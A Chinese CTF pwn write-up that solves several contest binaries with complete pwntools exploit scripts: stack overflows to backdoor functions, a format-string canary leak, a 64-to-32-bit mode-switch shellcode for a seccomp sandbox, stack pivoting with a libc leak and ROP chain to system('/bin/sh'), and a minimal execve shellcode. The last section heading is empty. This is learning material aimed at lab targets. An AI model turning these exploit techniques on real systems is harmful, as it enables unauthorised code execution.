CrazyCat PWN
![[Pasted image 20250211194321.png]]
# Day1
## ezpwn
![[Pasted image 20250210232353.png]]
输入的值与`DAT_00405068`一样后便可以栈溢出。
![[Pasted image 20250210232500.png]]
答案是年度最佳astrobot。
![[Pasted image 20250210232539.png]]
可以找到`backdoors`，构造`payload`即可。
exp:
```python
from pwn import *
from wstube import websocket

context(arch='amd64', os='linux', log_level='debug')
local = True
if local:
	p = process('./ezpwn')
else:
	p = websocket('ws://ctf.miaoaixuan.cn/api/proxy/0194eda1-f812-771e-9167-d804f8f8a76f')

ret = 0x40101a
backdoors = 0x401539
key = b'astrobot'
p.recvuntil(b'\x21\x0a')
p.send(key)
p.recvuntil(b'something:')
payload = b'A' * 0x58 + p64(ret) + p64(backdoors)
p.sendline(payload)
p.interactive()
```
shell:
![[Pasted image 20250210232813.png]]
## fmt_str
有`backdoor`，开启了`canary`，有格式化字符串漏洞，可以用该漏洞泄漏`canary`。
![[Pasted image 20250210232848.png]]
有两个有用的函数，第一个当地址为`0x404068`的值为`0x56785678`时便可以进入第二步，第二步则是简单的`ret2text`。
第一步用格式化字符串漏洞修改`0x404068`的值为`0x56785678`即可。
exp:
```python
from pwn import *
from wstube import websocket

context(arch='amd64', os='linux', log_level='debug')
local = False
if local:
	p = process('./fmt_str')
	pwnlib.gdb.attach(p, 'b *0x40127b')
else:
	p = websocket('ws://ctf.miaoaixuan.cn/api/proxy/0194f07e-58cc-74dd-b653-4657c29d274e')  

backdoor = 0x4013df
change_addr = 0x404068
ret = 0x40101a

p.sendlineafter(b'Input:', b'%25$p')
p.recvuntil(b'0x')
canary = int(p.recv(16), 16)
log.info(f'canary: {hex(canary)}')

payload = fmtstr_payload(8, {change_addr: 0x56785678}, write_size='byte')
p.sendlineafter(b'Input:', payload)
p.recvuntil(b'first step!')

payload2 = b'a' * 0x88 + p64(canary) + b'b' * 8 + p64(ret) + p64(backdoor)
p.sendline(payload2)

p.interactive()
```
shell:
![[Pasted image 20250210233359.png]]
## shellcode
![[Pasted image 20250210233720.png]]
可以看到是一个开启了`sandbox`的`shellcode`题。
![[Pasted image 20250210233928.png]]
`sandbox`仅允许使用`rw`,可以看到是缺`o`的，该怎么办呢，搜索后发现`fstat`函数的系统调用`0x5`是32位的`open`函数的系统调用，所以思路就是用`mmap`开辟一个新的空间来存放一段32位的程序然后在里面调用32位的`open`，然后再切换回64位调用`read`和`write`函数。
exp:
```python
from pwn import *
from wstube import websocket

# context(arch='amd64', os='linux', log_level='debug')
local = False
if local:
	p = process('./shellcode')
	pwnlib.gdb.attach(p, 'b printf')
else:
	p = websocket('ws://ctf.miaoaixuan.cn/api/proxy/0194f082-499c-7e79-aaec-7f4576faa685')

elf = ELF('./shellcode')
buf = elf.bss()
print(hex(buf))

shellcode = '''
	/* 恢复rsp */
	mov rsp, rdx
	add sp, 0x100
	
	/* mmap(0x40404040, 0x7e, 7, 34, 0, 0) */
	/* 一定要搞清楚哪个寄存器存哪个参数，不然怎么错的都不知道 */
	mov rdi, 0x40404040
	mov rsi, 0x7e
	mov rdx, 7
	mov rax, 9
	mov r8, 0
	mov r9, 0
	mov r10, 34
	syscall
	
	/* read(0, 0x40404040, 0x100) */
	mov rdi, 0
	mov rsi, 0x40404040
	mov rdx, 0x100
	mov rax, 0
	syscall
	
	/* mode_64 -> mode_32 */
	push 0x23
	push 0x40404040
	retfq
'''

shellcode_x86 = '''
	mov esp, 0x40404140
	push 0x67616c66
	push esp
	pop ebx
	xor ecx, ecx
	mov eax, 5
	int 0x80
	mov ecx, eax
'''
shellcode_flag = '''
	push 0x33
	push 0x40404089
	retfq
	
	mov rdi, rcx
	mov rsi, rsp
	mov rdx, 0x70
	xor rax, rax
	syscall
	
	mov rdi, 1
	mov rax, 1
	syscall
'''
shellcode = asm(shellcode, arch='amd64', os='linux')
shellcode_flag = asm(shellcode_flag, arch='amd64', os='linux')
shellcode_x86 = asm(shellcode_x86)
p.sendlineafter('shellcode:', shellcode)
pause()
p.sendline(shellcode_x86 + 0x29 * b'\x90' + shellcode_flag)

p.interactive()
```
shell:
![[Pasted image 20250210233827.png]]
## walt改造的编译器
是一个自制的编译器，编译后有一千多行代码不好逐行分析，大致作用就是输入一段c的代码然后会编译他并运行，我们直接输入
```c
int main()
{
	system("cat flag");
	return 0;
}
```
即可。题目只是看着唬人。
exp:
```python
from pwn import *
from wstube import websocket

context(arch='amd64', os='linux', log_level='debug')
local = False
if local:
	p = process('./walt')
	pwnlib.gdb.attach(p, 'b puts')
else:
	p = websocket('ws://ctf.miaoaixuan.cn/api/proxy/0194ef0d-e305-79ab-b861-72f478ac41cf')

test = r'''int main(){system("cat flag");return 0;}'''

# p.recvuntil(b'This is crazy!!!')
p.sendline(test)

p.interactive()
```
shell:
![[Pasted image 20250210234818.png]]

# D2
## Berial
![[Pasted image 20250211191107.png]]
可以看到有栈溢出但不多，可以猜到要用栈迁移，`checksec`后发现打开了`pie`，那么我们就需要获取很多东西，栈地址，`code`地址和`libc`的基址。
可以发现能泄漏的地方是第一次`read`的`puts`函数，他会一直输出直到遇到`\x00`。
那么思路就是，第一次循环内，用第一个`puts`先泄漏`code`段的地址获取`code`段的基址然后根据偏移就能得到`code`段的其他地址，在第二个`read`函数劫持返回回到开始，进入第二次循环。
第二次循环，用`puts`函数泄漏`stack`段的地址，然后开始构造栈迁移并泄漏`libc`，然后构造`ROP`获取`shell`。
下面是逐步分析。
第一步，泄漏`code`段地址。
```python
# payload1泄漏code段地址
payload1 = b'a' * (0x28 - 1) + b'b'
p.sendafter('name: ', payload1)
p.recvuntil(b'ab')
func_addr = u64(p.recv(6).ljust(8, b'\x00'))
func_base = func_addr - 0x10138d
```
![[Pasted image 20250211192422.png]]
将前面填充后可以看到泄漏了`code`段的地址，偏移是`0x10138d`，然后就获取了`code`段的基址。
![[Pasted image 20250211192546.png]]
第二步，栈溢出劫持返回，让程序回到`func`的开头准备第二次泄漏。
```python
# payload2回到func函数再次执行
payload2 = b'a' * 0x28 + p64(ret) + p64(func_base + 0x101367)
p.recvuntil(b'berial: ')
p.send(payload2)
```
![[Pasted image 20250211192821.png]]
第三步，再次构造`payload`泄漏`stack`段的地址，为栈迁移做准备。
```python
# payload3泄漏栈地址
payload3 = b'a' * (0x20 - 1) + b'c'
p.sendafter('name: ', payload3)
p.recvuntil(b'ac')
stack_addr = u64(p.recv(6).ljust(8, b'\x00'))
log.success('stack_addr: ' + hex(stack_addr))
```
![[Pasted image 20250211193005.png]]
第四步，泄露了`stack`段后开始着手构造栈迁移来泄漏`libc`基址。
![[Pasted image 20250211193129.png]]
查看栈上空间可以发现有`__libc_start_main + 128`，将栈迁移过去就可以再次利用puts来泄漏。(栈迁移详见我另一篇文章[[栈迁移]])
```python
# payload4开始构造栈迁移泄漏libc基址
payload4 = p64(stack_addr + 0xb0) + p64(func_base + 0x101229) + b'a' * 0x10 + p64(stack_addr - 0x30) + p64(leave_ret) + b'\x00' * 0x8
# 这里payload4还要填充八位是为了将read读满，不然下面的payload5没做延迟在调试的时候会同步输入导致payload5里差了八位。
p.sendafter(b'berial: ', payload4)
# payload4已经将栈迁移到位置，payload5泄漏__libc_start_main地址
payload5 = b'a' * (0x20 - 8 - 1) + b'd'
p.send(payload5)
p.recvuntil(b'ad')
__libc_start_main_add = u64(p.recv(6).ljust(8, b'\x00'))
__libc_start_main_base = __libc_start_main_add - 128
log.success('__libc_start_main_add: ' + hex(__libc_start_main_add))
log.success('__libc_start_main_base: ' + hex(__libc_start_main_base))
```
![[Pasted image 20250211193505.png]]
第五步，构造`ROP`获取`shell`。
```python
libc_base = __libc_start_main_base - libc.sym['__libc_start_main']

system = libc_base + libc.sym['system']
binsh = libc_base + 0x1d8678
pop_rdi = libc_base + 0x2a3e5

# payload6构造ROP链获取shell
payload6 = p64(pop_rdi) + p64(binsh) + p64(system) + b'\x00' * 0x8 + p64(stack_addr + 0x88) + p64(leave_ret)
p.sendafter(b'berial: ', payload6)
```
完整exp:
```python
from pwn import *
from wstube import websocket

context(arch='amd64', os='linux', log_level='debug')
local = True
if local:
	p = process('./berial')
	pwnlib.gdb.attach(p, 'b read')
else:
	p = websocket('ws://ctf.miaoaixuan.cn/api/proxy/0194f43b-72fc-7693-beac-89fcb498f37e')

libc = ELF('./libc/libc.so.6')

# payload1泄漏code段地址
payload1 = b'a' * (0x28 - 1) + b'b'
p.sendafter('name: ', payload1)
p.recvuntil(b'ab')
func_addr = u64(p.recv(6).ljust(8, b'\x00'))
func_base = func_addr - 0x10138d

ret = func_base + 0x10101a
leave_ret = func_base + 0x1012aa
func_addr = func_base + 0x1011e9
log.success('func_addr: ' + hex(func_addr))
log.success('func_base: ' + hex(func_base))

# payload2回到func函数再次执行
payload2 = b'a' * 0x28 + p64(ret) + p64(func_base + 0x101367)
p.recvuntil(b'berial: ')
p.send(payload2)
  
# payload3泄漏栈地址
payload3 = b'a' * (0x20 - 1) + b'c'
p.sendafter('name: ', payload3)
p.recvuntil(b'ac')
stack_addr = u64(p.recv(6).ljust(8, b'\x00'))
log.success('stack_addr: ' + hex(stack_addr))

# payload4开始构造栈迁移泄漏libc基址
payload4 = p64(stack_addr + 0xb0) + p64(func_base + 0x101229) + b'a' * 0x10 + p64(stack_addr - 0x30) + p64(leave_ret) + b'\x00' * 0x8
p.sendafter(b'berial: ', payload4)
# payload4已经将栈迁移到位置，payload5泄漏__libc_start_main地址
payload5 = b'a' * (0x20 - 8 - 1) + b'd'
p.send(payload5)
p.recvuntil(b'ad')
__libc_start_main_add = u64(p.recv(6).ljust(8, b'\x00'))
__libc_start_main_base = __libc_start_main_add - 128
log.success('__libc_start_main_add: ' + hex(__libc_start_main_add))
log.success('__libc_start_main_base: ' + hex(__libc_start_main_base))

libc_base = __libc_start_main_base - libc.sym['__libc_start_main']

system = libc_base + libc.sym['system']
binsh = libc_base + 0x1d8678
pop_rdi = libc_base + 0x2a3e5

# payload6构造ROP链获取shell
payload6 = p64(pop_rdi) + p64(binsh) + p64(system) + b'\x00' * 0x8 + p64(stack_addr + 0x88) + p64(leave_ret)
p.sendafter(b'berial: ', payload6)

p.interactive()
```
shell：
![[Pasted image 20250211193735.png]]
## unjoke
![[Pasted image 20250211194038.png]]
`shellcode`题，构造一个九字节以内的`execve`即可~~不会去问DeepSeek~~。
exp:
```python
from pwn import *
from wstube import websocket

context(arch='amd64', os='linux', log_level='debug')
local = False
if local:
	p = process('./unjoke')
	pwnlib.gdb.attach(p, 'b read')
else:
	p = websocket('ws://ctf.miaoaixuan.cn/api/proxy/0194f401-5078-7741-ac0c-4c7c4d67ab42')

shellcode ='''
	push 59
	pop rax
	xor esi, esi
	xor edx, edx
	syscall
'''
p.sendafter('code: ', asm(shellcode))
p.interactive()
```
shell:
![[Pasted image 20250211194251.png]]

## Natro
